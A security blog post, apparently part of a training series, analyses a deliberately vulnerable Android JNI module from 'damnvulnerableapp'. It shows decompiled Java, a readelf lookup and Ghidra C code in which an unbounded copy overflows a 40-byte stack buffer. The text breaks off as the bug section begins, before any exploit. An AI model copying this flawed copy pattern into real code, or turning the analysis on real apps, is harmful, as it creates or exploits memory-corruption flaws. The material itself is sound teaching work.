<!doctype html><html lang=en dir=ltr><head><title>E²VA: Stack Buffer Overflow Module (Part 3) :: lolcads tech blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Exploitation of EasyStackBufferOverflowModule This article describes exploitation of the EasyStackBufferOverflowModule. During exploitation, various Android - specific caveats are discussed.
Assumptions We will assume that we have successfully grabbed a copy of the .apk file of damnvulnerableapp. Also, we will not discuss how to unpack an .apk file, but rather assume that we have access to libEasyStackBufferOverflowModule.so and the EasyStackBufferOverflowModule class. If it is unclear how to get access to these components when only given an .apk file, read the previous blog posts first!
"><meta name=keywords content="Android,Binary Exploitation,JNI,E²VA,Buffer Overflow,Memory Leak"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://lolcads.github.io/posts/2024/07/eva_2/"><meta property="og:site_name" content="lolcads tech blog"><meta property="og:title" content="E²VA: Stack Buffer Overflow Module (Part 3)"><meta property="og:description" content="Exploitation of EasyStackBufferOverflowModule This article describes exploitation of the EasyStackBufferOverflowModule. During exploitation, various Android - specific caveats are discussed.
Assumptions We will assume that we have successfully grabbed a copy of the .apk file of damnvulnerableapp. Also, we will not discuss how to unpack an .apk file, but rather assume that we have access to libEasyStackBufferOverflowModule.so and the EasyStackBufferOverflowModule class. If it is unclear how to get access to these components when only given an .apk file, read the previous blog posts first!"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-07-23T16:46:21+01:00"><meta property="article:modified_time" content="2024-07-23T16:46:21+01:00"><meta property="article:tag" content="Android"><meta property="article:tag" content="Binary Exploitation"><meta property="article:tag" content="JNI"><meta property="article:tag" content="E²VA"><meta property="article:tag" content="Buffer Overflow"><meta property="article:tag" content="Memory Leak"><meta name=twitter:card content="summary"><meta name=twitter:title content="E²VA: Stack Buffer Overflow Module (Part 3)"><meta name=twitter:description content="Exploitation of EasyStackBufferOverflowModule This article describes exploitation of the EasyStackBufferOverflowModule. During exploitation, various Android - specific caveats are discussed.
Assumptions We will assume that we have successfully grabbed a copy of the .apk file of damnvulnerableapp. Also, we will not discuss how to unpack an .apk file, but rather assume that we have access to libEasyStackBufferOverflowModule.so and the EasyStackBufferOverflowModule class. If it is unclear how to get access to these components when only given an .apk file, read the previous blog posts first!"><link rel=canonical href=https://lolcads.github.io/posts/2024/07/eva_2/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.14211377552be17d56465ae537fca1a7e426b22c2c4ba496c85e278aaa470d24.css></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
<span class=sr-only>Open main menu</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Blog>Blog</a></li><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=contact><a class="block px-3 py-3 hover:text-emerald-600" href=/contact/ title=Contact>Contact</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/2024/07/eva_2/></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/2024/07/eva_2/>E²VA: Stack Buffer Overflow Module (Part 3)</a></h1><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/tags/android/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Android</span></a></li><li><a href=/tags/binary-exploitation/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Binary Exploitation</span></a></li><li><a href=/tags/jni/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>JNI</span></a></li><li><a href=/tags/eva/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>E²VA</span></a></li><li><a href=/tags/buffer-overflow/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Buffer Overflow</span></a></li><li><a href=/tags/memory-leak/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Memory Leak</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
</i><time datetime=2024-07-23T16:46:21+01:00>2024-07-23</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
</i><span>9 minutes to read</span></div></div><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-user"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 7a4 4 0 108 0A4 4 0 008 7"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
</i><span>Pascal Kühnemann</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#assumptions>Assumptions</a></li><li><a href=#analysis-baseline>Analysis baseline</a></li><li><a href=#the-bug>The Bug</a><ul><li><a href=#buffer-overflow>Buffer Overflow</a></li><li><a href=#memory-leaks>Memory Leak(s)</a></li></ul></li><li><a href=#exploitation->Exploitation >:)</a></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h1 id=exploitation-of-easystackbufferoverflowmodule>Exploitation of <em>EasyStackBufferOverflowModule</em></h1><p>This article describes exploitation of the <em>EasyStackBufferOverflowModule</em>. During exploitation, various Android - specific caveats are discussed.</p><h2 id=assumptions>Assumptions</h2><p>We will assume that we have successfully grabbed a copy of the <code>.apk</code> file of <em>damnvulnerableapp</em>. Also, we will <strong>not</strong> discuss how to unpack an <code>.apk</code> file, but rather assume that we have access to <code>libEasyStackBufferOverflowModule.so</code> and the <code>EasyStackBufferOverflowModule</code> class. If it is unclear how to get access to these components when only given an <code>.apk</code> file, read the previous blog posts first!</p><h2 id=analysis-baseline>Analysis baseline</h2><p>Lets first summarize what we have:</p><ol><li>Access to <code>libEasyStackBufferOverflowModule.so</code>, which is a <a href=http://www.sco.com/developers/gabi/latest/ch4.intro.html target=_blank rel=noopener>shared - object file</a>
that can be thrown into <a href=https://ghidra-sre.org/ target=_blank rel=noopener><em>Ghidra</em></a>
.</li><li>Access to <code>.apk</code> file, which can be thrown into <a href=https://github.com/skylot/jadx target=_blank rel=noopener><em>jadx</em></a>
.</li></ol><p>First of all, consider the native function as a black box and just decompile the Java code via <em>jadx</em>. Then, the code for <code>EasyStackBufferOverflowModule</code> should look like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.damnvulnerableapp.vulnerable.modules</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.damnvulnerableapp.common.exceptions.VulnerableModuleOperationException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.ByteBuffer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* loaded from: classes10.dex */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kd>class</span> <span class=nc>EasyStackBufferOverflowModule</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>VulnerableModule</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>vulnerableToUpper</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bArr</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>loadLibrary</span><span class=p>(</span><span class=s>&#34;EasyStackBufferOverflowModule&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>EasyStackBufferOverflowModule</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>StackBufferOverflowModuleConfiguration</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w> </span><span class=c1>// com.damnvulnerableapp.vulnerable.modules.VulnerableModule</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>VulnerableModuleOperationException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>message</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Welcome to the latest version of the echo service &gt;:)&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>do</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>message</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>input</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>unknown</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ByteBuffer</span><span class=p>.</span><span class=na>wrap</span><span class=p>(</span><span class=n>input</span><span class=p>()).</span><span class=na>getInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>upper</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>vulnerableToUpper</span><span class=p>(</span><span class=n>message</span><span class=p>,</span><span class=w> </span><span class=n>unknown</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>output</span><span class=p>(</span><span class=n>upper</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>message</span><span class=p>).</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;EXIT&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Exiting...&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>The above code shows that the module takes two distinct inputs per iteration:</p><ol><li>a message to be upper - cased</li><li>an integer that is also part of upper - casing.</li></ol><p>Both inputs are forwarded to a native function called <code>vulnerableToUpper</code>. Finally, the upper - cased message will be sent back to us.</p><p>From <code>EasyStackBufferOverflowModule</code> we can infer that there has to be a function in <code>libEasyStackBufferOverflowModule.so</code>, whose symbol name contains <code>vulnerableToUpper</code>. This can be confirmed via</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ readelf --wide --symbols libEasyStackBufferOverflowModule.so <span class=p>|</span> grep vulnerableToUpper
</span></span><span class=line><span class=cl>    6: 00000000000008f0   <span class=m>322</span> FUNC    GLOBAL DEFAULT   <span class=m>12</span> Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper
</span></span></code></pre></div><p>Okay, time for <em>Ghidra</em>! The following code has already been &ldquo;beautified&rdquo;:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>jbyteArray</span> <span class=nf>Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper</span>
</span></span><span class=line><span class=cl>          <span class=p>(</span><span class=n>JNIEnv</span> <span class=o>*</span><span class=n>env</span><span class=p>,</span> <span class=n>jobject</span> <span class=n>this</span><span class=p>,</span> <span class=n>jbyteArray</span> <span class=n>string</span><span class=p>,</span> <span class=n>jint</span> <span class=n>length</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>jbyte</span> <span class=o>*</span><span class=n>raw</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>jsize</span> <span class=n>stringLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>jbyteArray</span> <span class=n>array</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>fs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>uint</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>bufferLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buffer</span> <span class=p>[</span><span class=mi>40</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>canary</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>canary</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>fs</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>raw</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetByteArrayElements</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>string</span><span class=p>,(</span><span class=n>jboolean</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>stringLength</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetArrayLength</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>string</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>perfect_memcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span><span class=n>raw</span><span class=p>,(</span><span class=kt>int</span><span class=p>)</span><span class=n>stringLength</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x20</span><span class=p>;</span> <span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>buffer</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nf>toupper</span><span class=p>((</span><span class=kt>int</span><span class=p>)</span><span class=n>buffer</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=kt>int</span><span class=p>)</span><span class=n>length</span> <span class=o>&lt;</span> <span class=mh>0x101</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>bufferLength</span> <span class=o>=</span> <span class=nf>perfect_strlen</span><span class=p>(</span><span class=n>buffer</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=n>bufferLength</span> <span class=o>=</span> <span class=nf>perfect_strlen</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>array</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>NewByteArray</span><span class=p>)(</span><span class=n>env</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>bufferLength</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>SetByteArrayRegion</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>array</span><span class=p>,</span><span class=mi>0</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>bufferLength</span><span class=p>,</span><span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>fs</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>)</span> <span class=o>==</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>array</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=cm>/* WARNING: Subroutine does not return */</span>
</span></span><span class=line><span class=cl>    <span class=nf>__stack_chk_fail</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>perfect_memcpy</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>dst</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>src</span><span class=p>,</span> <span class=n>uint</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>size</span><span class=p>;</span> <span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>dst</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>src</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>uint</span> <span class=nf>perfect_strlen</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>string</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>string</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span> <span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h2 id=the-bug>The Bug</h2><p>As the module name suggests, there is indeed a buffer overflow bug. One function that is often part of a buffer overflow is <code>memcpy</code>. Thus, taking a closer look into how <code>memcpy</code> is used can turn out useful.</p><h3 id=buffer-overflow>Buffer Overflow</h3><p>First of all, we can see that there is a classical buffer overflow:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=nf>memset</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>raw</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetByteArrayElements</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>string</span><span class=p>,(</span><span class=n>jboolean</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>stringLength</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetArrayLength</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>string</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>perfect_memcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span><span class=n>raw</span><span class=p>,(</span><span class=kt>int</span><span class=p>)</span><span class=n>stringLength</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
